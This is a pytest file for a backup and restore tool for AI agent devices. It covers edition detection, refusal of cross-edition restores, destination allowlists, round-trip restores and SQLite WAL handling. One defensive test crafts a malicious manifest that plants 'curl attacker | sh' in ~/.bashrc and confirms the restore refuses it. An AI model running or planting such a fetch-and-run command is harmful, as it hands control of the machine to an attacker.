"""Backend selection, the cross-edition guard, and the round trip.

The round trip at the bottom is the test this whole change exists for: a
Hermes box makes a backup, the box is wiped, the backup is restored, and every
byte the customer cares about is back.
"""

from __future__ import annotations

import json
import sqlite3
import tarfile
from pathlib import Path
from unittest.mock import patch

import pytest

from clawkeep import agent, hermes, openclaw, restore
from clawkeep.api import Credentials
from clawkeep.config import Config, HeartbeatConfig, OpenclawConfig

CREDS = Credentials(
    accessKeyId="AK", secretAccessKey="SK", sessionToken="ST",
    endpoint="https://acct.r2.cloudflarestorage.com", bucket="clawkeep",
    prefix="users/u_x/repo/", expiresAt=9_999_999_999_999,
    quotaBytes=5_368_709_120, cloudBytes=0,
)


def _cfg() -> Config:
    return Config(
        server="https://server",
        schedule="daily",
        openclaw=OpenclawConfig(binary="openclaw"),
        heartbeat=HeartbeatConfig(idle_interval_hours=24),
    )


@pytest.fixture()
def edition_file(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    p = tmp_path / "edition.env"
    monkeypatch.setattr(agent, "EDITION_FILE", str(p))
    monkeypatch.delenv("CLAWBOX_EDITION", raising=False)
    return p


# ── which agent is this box? ─────────────────────────────────────────────────

def test_root_owned_file_decides_the_edition(edition_file: Path) -> None:
    edition_file.write_text(
        "# written by setup-hermes-edition.sh\nCLAWBOX_EDITION=hermes\n",
        encoding="utf-8",
    )
    assert agent.device_agent() == "hermes"


def test_quoted_and_exported_forms_parse(edition_file: Path) -> None:
    edition_file.write_text('export CLAWBOX_EDITION="hermes"\n', encoding="utf-8")
    assert agent.read_edition() == "hermes"


def test_missing_file_falls_back_to_the_environment(
    edition_file: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Dev boxes and CI have no /etc/clawbox. Same fallback order as the TS
    reader, so the two never disagree about a box."""
    monkeypatch.setenv("CLAWBOX_EDITION", "hermes")
    assert agent.read_edition() == "hermes"


def test_default_is_openclaw_when_nothing_says_otherwise(edition_file: Path) -> None:
    assert agent.device_agent() == "openclaw"


def test_a_converted_box_backs_up_the_agent_it_actually_runs(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A box converted OpenClaw → Hermes keeps a stale `~/.openclaw` next to
    the live `~/.hermes` (2.7 MB of it on the QA box). Picking the backend off
    "which directory exists" would have that box faithfully archiving an agent
    it stopped running."""
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    monkeypatch.setenv("HOME", str(tmp_path))
    (tmp_path / ".openclaw").mkdir()
    (tmp_path / ".hermes").mkdir()
    assert agent.device_agent() == "hermes"


def test_dual_prefers_openclaw_because_that_is_the_default_harness(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    edition_file.write_text("CLAWBOX_EDITION=dual\n", encoding="utf-8")
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("HERMES_HOME", str(tmp_path / ".hermes"))
    (tmp_path / ".openclaw").mkdir()
    (tmp_path / ".hermes").mkdir()
    assert agent.device_agent() == "openclaw"


# ── which agent wrote this snapshot? ─────────────────────────────────────────

def test_an_archive_with_no_agent_key_is_an_openclaw_one(edition_file: Path) -> None:
    """Every snapshot written before the key existed was OpenClaw's.
    Defaulting the other way would make every historical archive unrestorable
    on the device that made it."""
    assert agent.archive_agent({"archiveRoot": "x"}) == "openclaw"


def test_cross_edition_restore_is_refused_by_name(edition_file: Path) -> None:
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    with pytest.raises(agent.AgentMismatchError) as excinfo:
        agent.assert_archive_matches_device({"agent": "openclaw"})
    message = str(excinfo.value)
    # Names both sides and explains WHY the wrong snapshot was offered, because
    # the customer did nothing wrong — the portal listed it.
    assert "openclaw" in message and "hermes" in message
    assert "one list" in message


def test_matching_edition_passes_silently(edition_file: Path) -> None:
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    agent.assert_archive_matches_device({"agent": "hermes"})


def test_create_archive_routes_to_the_hermes_backend(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    (home / ".hermes").mkdir(parents=True)
    (home / ".hermes" / "config.yaml").write_text("a: b\n", encoding="utf-8")

    out = agent.create_archive(_cfg(), output_dir=tmp_path / "out")
    assert out.archive_root.endswith("-hermes-backup")
    assert hermes.read_manifest(out.path)["agent"] == "hermes"


# ── where a restore may land ─────────────────────────────────────────────────

def _hermes_box(edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    return home


def test_restore_roots_follow_the_env_on_each_edition(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Hermes: exactly the ASSETS allowlist under HERMES_HOME / CLAWBOX_HOME —
    the same resolution `create_archive` used, so a round trip on a box with
    the env set still matches. OpenClaw: whatever the CLI's dry-run declares,
    resolved by the CLI under the environment it was spawned with."""
    home = _hermes_box(edition_file, tmp_path, monkeypatch)
    roots = agent.restore_roots(_cfg())
    assert roots.agent == "hermes"
    assert {r.path for r in roots.roots} == {str(hermes.source_path(a)) for a in hermes.ASSETS}
    assert str(home / ".hermes" / "config.yaml") in {r.path for r in roots.roots}
    by_kind = {r.kind: r for r in roots.roots}
    assert by_kind["sessions"].entry == "file" and by_kind["sessions"].sqlite
    assert by_kind["memories"].entry == "dir" and not by_kind["memories"].sqlite
    assert by_kind["identity"].path == str(home / ".clawbox" / "agent-identity")

    edition_file.write_text("CLAWBOX_EDITION=openclaw\n", encoding="utf-8")
    state = tmp_path / "elsewhere" / ".openclaw"
    with patch(
        "clawkeep.openclaw.plan_roots",
        return_value=(
            openclaw.PlannedRoot("state", str(state)),
            openclaw.PlannedRoot("agent", str(state / "agents" / "main" / "agent")),
        ),
    ) as plan:
        roots = agent.restore_roots(_cfg())
    plan.assert_called_once_with("openclaw")
    assert roots.agent == "openclaw"
    assert {r.path for r in roots.roots} == {str(state), str(state / "agents" / "main" / "agent")}
    assert all(r.entry == "dir" and not r.sqlite for r in roots.roots)


def test_a_hermes_destination_is_pinned_to_its_kind(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = _hermes_box(edition_file, tmp_path, monkeypatch)
    roots = agent.restore_roots(_cfg())
    memories = str(home / ".hermes" / "memories")
    config = str(home / ".hermes" / "config.yaml")

    # The real thing passes, with the shape it was archived in.
    assert agent.assert_destination_allowed("memories", "dir", memories, roots=roots) == memories
    assert agent.assert_destination_allowed("config", "file", config, roots=roots) == config
    assert agent.assert_destination_allowed(
        "sessions", "file", str(home / ".hermes" / "state.db"), roots=roots, sqlite=True,
    )

    # `entry: "file"` for a kind Hermes declares as a directory: a file swap
    # over `memories/` would delete the directory.
    with pytest.raises(agent.DestinationRefusedError, match="archives it as a 'dir'"):
        agent.assert_destination_allowed("memories", "file", memories, roots=roots)
    # sqlite on a plain file: restore would rename `config.yaml-wal` aside.
    with pytest.raises(agent.DestinationRefusedError, match="not a sqlite database"):
        agent.assert_destination_allowed("config", "file", config, roots=roots, sqlite=True)
    # The right kind at the wrong place — the classic: `~/.bashrc` as the config.
    with pytest.raises(agent.DestinationRefusedError) as excinfo:
        agent.assert_destination_allowed("config", "file", str(home / ".bashrc"), roots=roots)
    assert ".bashrc" in str(excinfo.value) and config in str(excinfo.value)
    # A kind no Hermes backup contains.
    with pytest.raises(agent.DestinationRefusedError, match="not something a Hermes backup contains"):
        agent.assert_destination_allowed("ssh", "dir", str(home / ".ssh"), roots=roots)
    # A user unit under the home: Linger=yes on the box, so it would run at boot.
    with pytest.raises(agent.DestinationRefusedError):
        agent.assert_destination_allowed(
            "hooks", "dir", str(home / ".config" / "systemd" / "user"), roots=roots,
        )


def test_an_openclaw_destination_must_be_a_declared_root_or_nested_agent_state(
    edition_file: Path, tmp_path: Path,
) -> None:
    state = tmp_path / ".openclaw"
    roots = agent.RestoreRoots(agent="openclaw", roots=(
        agent.RestoreRoot(str(state), "state", "dir", False, False),
        agent.RestoreRoot(str(tmp_path / "openclaw.json"), "config", "file", False, False),
    ))
    assert agent.assert_destination_allowed("state", "dir", str(state), roots=roots)
    # The one file kind, pinned to `file`.
    assert agent.assert_destination_allowed("config", "file", str(tmp_path / "openclaw.json"), roots=roots)
    # The CLI writes no `entry` key, so a `config` asset arrives as "dir" by
    # default and is refused — as a limitation of this restore (put the file
    # back by hand), never as the snapshot lying.
    with pytest.raises(agent.DestinationRefusedError, match="has to be put back by hand") as excinfo:
        agent.assert_destination_allowed("config", "dir", str(tmp_path / "openclaw.json"), roots=roots)
    assert "manifest says" not in str(excinfo.value)
    # A per-agent root or workspace INSIDE the state dir: the box may have
    # dropped that agent from openclaw.json since the snapshot was taken.
    assert agent.assert_destination_allowed(
        "agent", "dir", str(state / "agents" / "old" / "agent"), roots=roots,
    )
    assert agent.assert_destination_allowed("workspace", "dir", str(state / "workspace"), roots=roots)
    # But `state` — or anything else — inside a root is not a root.
    with pytest.raises(agent.DestinationRefusedError, match="not a place this box's OpenClaw keeps state"):
        agent.assert_destination_allowed("state", "dir", str(state / "credentials"), roots=roots)
    # And nested does not mean "anywhere": the checkout is not under a root.
    with pytest.raises(agent.DestinationRefusedError) as excinfo:
        agent.assert_destination_allowed("workspace", "dir", "/home/clawbox/clawbox", roots=roots)
    assert "/home/clawbox/clawbox" in str(excinfo.value)
    assert str(state) in str(excinfo.value)  # names what IS allowed, for the owner


@pytest.mark.parametrize("target", ["install.sh", "~/.openclaw", "/home/x/../etc", "/home/x/", "//home/x"])
def test_every_destination_must_be_absolute_and_normalised(edition_file: Path, target: str) -> None:
    roots = agent.RestoreRoots(agent="openclaw", roots=(
        agent.RestoreRoot("/home/x", "state", "dir", False, False),
    ))
    with pytest.raises(agent.DestinationRefusedError, match="absolute, normalised") as excinfo:
        agent.assert_destination_allowed("state", "dir", target, roots=roots)
    assert target in str(excinfo.value)


def test_restore_refuses_a_hermes_manifest_that_moves_an_asset_before_anything_moves(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The finding on the Hermes edition: `entry: "file"` at `~/.bashrc`, in
    a manifest that says `agent: hermes` and verifies clean (hermes.verify
    only checks that every archivePath has bytes). Refused by name, and the
    good assets ahead of it in the list are never moved."""
    home = _hermes_box(edition_file, tmp_path, monkeypatch)
    _seed(home)
    (home / ".bashrc").write_text("export PS1=owner\n", encoding="utf-8")
    live_config = (home / ".hermes" / "config.yaml").read_text()

    root = "snap-root"
    payload = {
        "config": (home / ".hermes" / "config.yaml", b"model: attacker\n"),
        "hooks": (home / ".bashrc", b"curl attacker | sh\n"),
    }
    manifest = {
        "schemaVersion": 1, "agent": "hermes", "archiveRoot": root,
        "assets": [
            {"kind": kind, "sourcePath": str(target), "entry": "file",
             "archivePath": f"{root}/payload/posix/{hermes._tar_name(target)}"}
            for kind, (target, _) in payload.items()
        ],
    }
    archive = tmp_path / "snap.tar.gz"
    with tarfile.open(archive, "w:gz") as tf:
        import io
        blob = json.dumps(manifest).encode("utf-8")
        info = tarfile.TarInfo(f"{root}/manifest.json")
        info.size = len(blob)
        tf.addfile(info, io.BytesIO(blob))
        for target, content in payload.values():
            info = tarfile.TarInfo(f"{root}/payload/posix/{hermes._tar_name(target)}")
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    hermes.verify_archive(archive)  # the archive is, by the verifier's lights, fine

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        dest_path.write_bytes(archive.read_bytes())

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        with pytest.raises(restore.RestoreError, match=r"\.bashrc"):
            restore.restore_snapshot(_cfg(), "claw_x", "snap-root.tar.gz")

    assert (home / ".bashrc").read_text() == "export PS1=owner\n"
    assert (home / ".hermes" / "config.yaml").read_text() == live_config
    assert not list(home.glob(".bashrc.bak-restore-*"))
    assert not list((home / ".hermes").glob("config.yaml.bak-restore-*"))
    assert not list((home / ".hermes").glob(".clawkeep-restore-*"))
    assert not list(home.glob(".clawkeep-restore-*"))


# ── the round trip ───────────────────────────────────────────────────────────

def _seed(home: Path) -> None:
    hermes_home = home / ".hermes"
    hermes_home.mkdir(parents=True)
    (hermes_home / "config.yaml").write_text("model: hermes-4\nvoice: on\n", encoding="utf-8")
    (hermes_home / ".env").write_text("ANTHROPIC_API_KEY=sk-live\n", encoding="utf-8")
    (hermes_home / "memories").mkdir()
    (hermes_home / "memories" / "MEMORY.md").write_text("owner likes tea\n", encoding="utf-8")
    (hermes_home / "skills" / "email").mkdir(parents=True)
    (hermes_home / "skills" / "email" / "SKILL.md").write_text("send mail\n", encoding="utf-8")
    conn = sqlite3.connect(hermes_home / "state.db")
    conn.execute("CREATE TABLE turns (id INTEGER PRIMARY KEY, body TEXT)")
    conn.execute("INSERT INTO turns (body) VALUES ('remember this')")
    conn.commit()
    conn.close()
    (home / ".clawbox" / "agent-identity").mkdir(parents=True)
    (home / ".clawbox" / "agent-identity" / "SOUL.md").write_text("I am Claw.\n", encoding="utf-8")
    # Bulk that must survive the restore untouched because it never travelled.
    (hermes_home / "hermes-agent").mkdir()
    (hermes_home / "hermes-agent" / "huge.bin").write_bytes(b"\1" * 4096)


def test_backup_then_restore_brings_the_box_back(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Backup → wipe → restore, on the manifest-driven path the device uses.

    Only the network is faked: `mint_credentials` and `s3.download` stand in
    for the portal and R2. Everything else — the archiver, the manifest, the
    verify, the per-asset extraction, the atomic swap — is the real code.
    """
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    _seed(home)

    made = agent.create_archive(_cfg(), output_dir=tmp_path / "out")
    snapshot_name = made.path.name

    # Wipe the state the customer would lose, and leave behind the junk a
    # half-broken box has, so we can prove it is replaced rather than merged.
    hermes_home = home / ".hermes"
    (hermes_home / "config.yaml").write_text("CORRUPT\n", encoding="utf-8")
    (hermes_home / ".env").write_text("", encoding="utf-8")
    (hermes_home / "memories" / "MEMORY.md").write_text("nothing\n", encoding="utf-8")
    (hermes_home / "skills" / "email" / "SKILL.md").write_text("broken\n", encoding="utf-8")
    (hermes_home / "skills" / "stray").mkdir()
    (home / ".clawbox" / "agent-identity" / "SOUL.md").write_text("who?\n", encoding="utf-8")
    conn = sqlite3.connect(hermes_home / "state.db")
    conn.execute("DELETE FROM turns")
    conn.commit()
    conn.close()

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        dest_path.write_bytes(made.path.read_bytes())

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        result = restore.restore_snapshot(_cfg(), "claw_x", snapshot_name)

    assert {a.kind for a in result.assets} >= {
        "config", "credentials", "sessions", "memories", "skills", "identity",
    }

    # File assets — the three restore could not handle before this change.
    assert (hermes_home / "config.yaml").read_text() == "model: hermes-4\nvoice: on\n"
    assert (hermes_home / ".env").read_text() == "ANTHROPIC_API_KEY=sk-live\n"
    conn = sqlite3.connect(hermes_home / "state.db")
    try:
        assert conn.execute("SELECT body FROM turns").fetchall() == [("remember this",)]
    finally:
        conn.close()

    # Directory assets — replaced wholesale, so post-backup junk is gone.
    assert (hermes_home / "memories" / "MEMORY.md").read_text() == "owner likes tea\n"
    assert (hermes_home / "skills" / "email" / "SKILL.md").read_text() == "send mail\n"
    assert not (hermes_home / "skills" / "stray").exists()
    assert (home / ".clawbox" / "agent-identity" / "SOUL.md").read_text() == "I am Claw.\n"

    # What never travelled is still there: restore must not delete the 1.5 GB
    # checkout just because the archive has no opinion about it.
    assert (hermes_home / "hermes-agent" / "huge.bin").read_bytes() == b"\1" * 4096

    # No staging litter left in the customer's state directory.
    assert not list(hermes_home.glob(".clawkeep-restore-*"))
    assert not list(home.glob(".clawbox/.clawkeep-restore-*"))


def test_restore_refuses_an_openclaw_snapshot_on_a_hermes_box(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The reachable data-loss case: one portal account, one R2 prefix, both
    devices' snapshots in one list. Refusing must happen BEFORE anything on
    disk moves."""
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    _seed(home)
    live = (home / ".hermes" / "config.yaml").read_text()

    target = home / ".openclaw"
    target.mkdir()
    (target / "openclaw.json").write_text("{}", encoding="utf-8")

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        root = "snap-root"
        sub = f"{root}/payload/posix/{hermes._tar_name(target)}"
        manifest = {
            "schemaVersion": 1,
            "archiveRoot": root,
            # No `agent` key at all: exactly what a real pre-Hermes OpenClaw
            # archive looks like.
            "assets": [{"kind": "state", "sourcePath": str(target), "archivePath": sub}],
        }
        with tarfile.open(dest_path, "w:gz") as tf:
            blob = json.dumps(manifest).encode("utf-8")
            info = tarfile.TarInfo(f"{root}/manifest.json")
            info.size = len(blob)
            import io
            tf.addfile(info, io.BytesIO(blob))
            tf.add(target, arcname=sub, recursive=True)

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        with pytest.raises(restore.RestoreError, match="cannot be restored onto this hermes"):
            restore.restore_snapshot(_cfg(), "claw_x", "snap-root.tar.gz")

    # Nothing moved: not the Hermes state, not the stale OpenClaw directory.
    assert (home / ".hermes" / "config.yaml").read_text() == live
    assert (target / "openclaw.json").read_text() == "{}"
    assert not list(home.glob(".openclaw.bak-restore-*"))


def test_a_wal_database_restores_without_its_stale_sidecars(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The live agent keeps `state.db` in WAL mode — 2.6 MB of pending writes
    in a `-wal` sidecar next to a 2.8 MB database, measured on the QA box.

    The archived copy comes through `Connection.backup()`, so it is already
    checkpointed and complete on its own. What must NOT survive the restore is
    the OLD database's `-wal`/`-shm` pair: sqlite decides whether to replay a
    WAL by finding the file, not by checking that it belongs, so leaving them
    turns a correct restore into a corrupt or silently-stale history the next
    time anything opens the database.
    """
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    _seed(home)
    db = home / ".hermes" / "state.db"

    # Put the database into WAL mode and leave uncommitted-to-main writes in
    # the sidecar, exactly as the running dashboard does.
    conn = sqlite3.connect(db)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("INSERT INTO turns (body) VALUES ('in the wal')")
    conn.commit()
    assert db.with_name("state.db-wal").exists()  # the sidecar is real
    # `backup()` reads THROUGH the wal, so both rows land in the archive even
    # though the second one is only in the sidecar at this moment.
    made = agent.create_archive(_cfg(), output_dir=tmp_path / "out")
    conn.close()

    # Closing the last handle checkpoints and removes the sidecars, so put the
    # stale pair back explicitly: leftovers beside a swapped-in database are
    # precisely the state being defended against, and fabricating them makes
    # the test independent of when sqlite happens to checkpoint.
    db.with_name("state.db-wal").write_bytes(b"stale wal")
    db.with_name("state.db-shm").write_bytes(b"stale shm")

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        dest_path.write_bytes(made.path.read_bytes())

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        restore.restore_snapshot(_cfg(), "claw_x", made.path.name)

    # The stale sidecars are gone from beside the restored database...
    assert not db.with_name("state.db-wal").exists()
    assert not db.with_name("state.db-shm").exists()
    # ...moved aside, not destroyed, so the restore stays reversible by hand.
    assert list(db.parent.glob("state.db-wal.bak-restore-*"))

    conn = sqlite3.connect(db)
    try:
        rows = {r[0] for r in conn.execute("SELECT body FROM turns")}
    finally:
        conn.close()
    assert rows == {"remember this", "in the wal"}


def test_the_shared_identity_symlinks_come_back(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`~/.hermes/SOUL.md` and `memories/{MEMORY,USER}.md` are ABSOLUTE
    symlinks into `~/.clawbox/agent-identity/` — the shared identity bridge.

    Restore used to refuse every absolute link as unsafe, so it dropped all
    three, left `memories/` holding nothing but a stale lock file, and
    reported success. That is the false-success shape the brief forbids, and
    it was found by running the real restore on a real box rather than by
    reading the code.
    """
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    _seed(home)

    bridge = home / ".clawbox" / "agent-identity"
    (bridge / "MEMORY.md").write_text("owner likes tea\n", encoding="utf-8")
    link = home / ".hermes" / "memories" / "MEMORY.md"
    link.unlink()
    try:
        link.symlink_to(bridge / "MEMORY.md")  # absolute, like the real bridge
    except (OSError, NotImplementedError):
        pytest.skip("this platform will not let the test create a symlink")

    made = agent.create_archive(_cfg(), output_dir=tmp_path / "out")
    link.unlink()

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        dest_path.write_bytes(made.path.read_bytes())

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        result = restore.restore_snapshot(_cfg(), "claw_x", made.path.name)

    assert link.is_symlink(), "the identity link was dropped"
    assert link.read_text() == "owner likes tea\n"
    # And nothing was quietly discarded on the way.
    assert result.skipped_members == []


def test_a_link_out_of_the_archives_own_roots_is_refused_and_reported(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The other half: a link to somewhere the archive does not own is still
    refused — but it is now REPORTED rather than only logged, so a restore
    that dropped something can never look complete."""
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    _seed(home)

    outsider = home / ".hermes" / "memories" / "escape.md"
    try:
        outsider.symlink_to(tmp_path / "somewhere-else" / "secret")
    except (OSError, NotImplementedError):
        pytest.skip("this platform will not let the test create a symlink")

    made = agent.create_archive(_cfg(), output_dir=tmp_path / "out")

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        dest_path.write_bytes(made.path.read_bytes())

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        result = restore.restore_snapshot(_cfg(), "claw_x", made.path.name)

    assert not (home / ".hermes" / "memories" / "escape.md").exists()
    assert any("escape.md" in m for m in result.skipped_members)


def test_a_later_asset_failure_does_not_strip_the_old_database_of_its_wal(
    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Retiring the sqlite sidecars is the one step in the asset loop that
    `_rollback_swaps` cannot reverse — and what it would destroy is the newest
    data on the box.

    A WAL database keeps its most recent writes in the sidecar: 2.6 MB of them
    against a 2.8 MB `state.db` on the QA box. Retiring them as soon as the
    `sessions` asset landed, and then failing on an asset later in the list,
    would roll the OLD database back into place with its WAL renamed away —
    silently losing every conversation that had not been checkpointed. So the
    retirement waits until the whole restore has succeeded.
    """
    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
    _seed(home)

    made = agent.create_archive(_cfg(), output_dir=tmp_path / "out")

    db = home / ".hermes" / "state.db"
    db.with_name("state.db-wal").write_bytes(b"the newest 2.6MB")
    db.with_name("state.db-shm").write_bytes(b"shm")

    # Fail on an asset that sorts AFTER `sessions` in the manifest order.
    real_swap = restore._swap_into_place

    def swap_but_fail_on_skills(staging: Path, target: Path, *, ts: int) -> Path:
        if target.name == "skills":
            raise OSError("disk went away mid-restore")
        return real_swap(staging, target, ts=ts)

    monkeypatch.setattr(restore, "_swap_into_place", swap_but_fail_on_skills)

    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
        dest_path.write_bytes(made.path.read_bytes())

    with (
        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
        patch("clawkeep.restore.s3.download", side_effect=fake_download),
    ):
        with pytest.raises(restore.RestoreError):
            restore.restore_snapshot(_cfg(), "claw_x", made.path.name)

    # The rolled-back database still has the sidecar holding its newest writes.
    assert db.with_name("state.db-wal").read_bytes() == b"the newest 2.6MB"
    assert db.with_name("state.db-shm").exists()
